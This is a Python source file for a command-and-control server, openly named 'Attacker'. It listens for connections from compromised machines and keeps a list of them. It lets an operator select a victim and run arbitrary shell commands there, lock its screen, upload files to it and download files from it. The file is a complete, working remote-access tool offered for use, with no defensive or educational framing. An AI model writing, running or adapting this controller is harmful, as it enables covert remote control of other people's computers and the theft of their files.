import socket
import threading
import argparse
from queue import Queue
import os
import select

MAX_BYTES = 1024
class Attacker:
    def __init__(self, ip, port) -> None:
        self.ip = ip
        self.port = port
        self.workers = 2
        self.connected_clients = {}
        self.active_client = None
        self.queue = Queue()


    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:    
            self.server_socket.bind((self.ip, self.port))
            self.server_socket.listen()
        except Exception as e:
            raise(e)
        print(F"[+] Server is ls listening on {self.ip}:{self.port}\n")
    

    def handle_connection(self):
        while True:
            client, address = self.server_socket.accept()
            print(F'\n[+] Connection established from: {address}')
            self.connected_clients[str(len(self.connected_clients)+1)] = (client, address)


    def list_connections(self):
        if self.connected_clients:
            print("---- Connected clients ----")    
            for index, connection in enumerate(self.connected_clients.values()):
                address = F"{connection[1][0]}:{connection[1][1]}"
                print(F"{index+1}. {address}")
            print()
            return
        print('[-] No clients...  yet :)')


    def get_client(self, client_id):
        client = self.connected_clients.get(client_id, None)
        return client
    

    def exit_client(self, client, cmd):
        client.send(b"exit")
        client.close()
        del self.connected_clients[self.active_client]


    @staticmethod
    def lock_screen(client, cmd):
        """ Lock remote machine screen """
        client.send('lock'.encode())
        print(client.recv(MAX_BYTES).decode())


    @staticmethod
    def download_file(client, cmd):
        if len(cmd) != 3:
            return
        src_file, dst_file = cmd[1:]
        client.send(F"download {src_file}".encode())
        client_data = client.recv(MAX_BYTES).decode()
        try:
            file_size = int(client_data)                
            if file_size:
                with open(dst_file, 'wb') as fd:
                    local_file_size = 0
                    client.send(F"ack".encode())
                    while file_size != local_file_size:
                        source_data = client.recv(MAX_BYTES)
                        local_file_size += len(source_data)
                        fd.write(source_data)
                    print(F"[+] File: {dst_file} was downloaded successfully")
        except PermissionError as perm_err:
            print(perm_err)
            # indicates to the client to not start fetching data due to local error (perm_error...)
            client.send('abort'.encode())
        except:
            print(F"[-] error on remote machine while downloading remote file: {client_data}")
            

    @staticmethod
    def upload_file(client, cmd):
        """ Upload a file to remote machine """
        if len(cmd) != 3:
            return
        src_file, dst_file = cmd[1:]
        try:
            with open(src_file, 'rb') as fd:
                file_size = os.stat(src_file).st_size
                client.send(F"upload {dst_file} {file_size}".encode())
                client_ack = client.recv(MAX_BYTES).decode()
                if "ack" == client_ack: # start sending file's data
                    while True:
                        file_content = fd.read(1024)
                        if not file_content:
                            print(F"[+] File: {src_file} was uploaded successfully")
                            break
                        client.send(file_content)
                    return
                print(F"[-] error on remote machine while uploading local file: {client_ack}")
        except Exception as e:
            print(e)
           

    def client_interaction(self, client):
        cmd_func_mapping = {"lock": self.lock_screen, 
                            "download": self.download_file, 
                            "upload": self.upload_file, 
                            "exit": self.exit_client,
                            }
        
        conn, addr = client
        address = F"{addr[0]}:{addr[1]}"
        while True:
            cmd = input(F"{address} -> ".strip())
            if len(cmd.strip()) == 0:
                continue
            elif cmd in ("quit", "exit"):
                break
            split_user_data = cmd.split(" ")
            func = cmd_func_mapping.get(split_user_data[0], None)
            if func:
                func(conn, split_user_data)
                continue
            shell_cmd_thread = threading.Thread(target=self.shell_data, args=(conn, cmd), daemon=True)
            shell_cmd_thread.start()



    @staticmethod
    def shell_data(conn, prompt):
        conn.send(prompt.encode())
        while True:
            ready_read, _, _ = select.select([conn], [], [], 0)
            if ready_read:
                    data = conn.recv(MAX_BYTES).decode()
                    if data.strip():
                        print(F"\n{data}")
                    break


    @staticmethod
    def help_menu():
        print("""
        User commands: 
        1. list -> list connections
        2. select x -> interact with specified client
        3. exit -> close all client's connections and exit program
        4. help -> show this help message

        Client commands:
        1. lock -> lock target screen
        2. upload -> upload file to target host
        3. download -> download file from target host
        4. exit/quit -> remove client
        """)


    def handle_interaction(self):
        user_func_mapping = {"list": self.list_connections, "help": self.help_menu}
        while True:
            prompt = input("$ ")
            if len(prompt.strip()) == 0:
                continue
            user_func = user_func_mapping.get(prompt, None)
            if user_func:
                user_func()
                continue
            elif prompt.startswith("select "):
                client_id = prompt[7:]
                client = self.get_client(client_id)
                if client:
                    self.active_client = client_id
                    self.client_interaction(client)
                continue
            elif prompt == "exit":
                break
            else:
                print("[-] Invalid command...")
            

    def create_workers(self):
        for i in range(self.workers):
            self.queue.put(i)
            t = threading.Thread(target=self.get_task, daemon=True)
            t.start()
        self.queue.join()


    def get_task(self):
        task = self.queue.get()
        if task == 0:
            self.handle_interaction()
            self.flush_clients_conn()
            self.close_server()
        elif task == 1:
            self.handle_connection()
        self.queue.task_done()
        self.queue.task_done()


    def flush_clients_conn(self):
        for client in self.connected_clients.values():
            conn = client[0]
            conn.send(b"exit")
            conn.close()


    def close_server(self):
        self.server_socket.close()
        print("[+] Server closed")


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str)
    parser.add_argument('--port', type=int, required=True)
    args = parser.parse_args()
    return args


def main():
    args = get_args()
    ip, port = args.ip, args.port
    if not ip:
        ip = ""
    attacker = Attacker(ip, port)
    attacker.start_server()
    attacker.create_workers()
    


if __name__ == "__main__":
    main()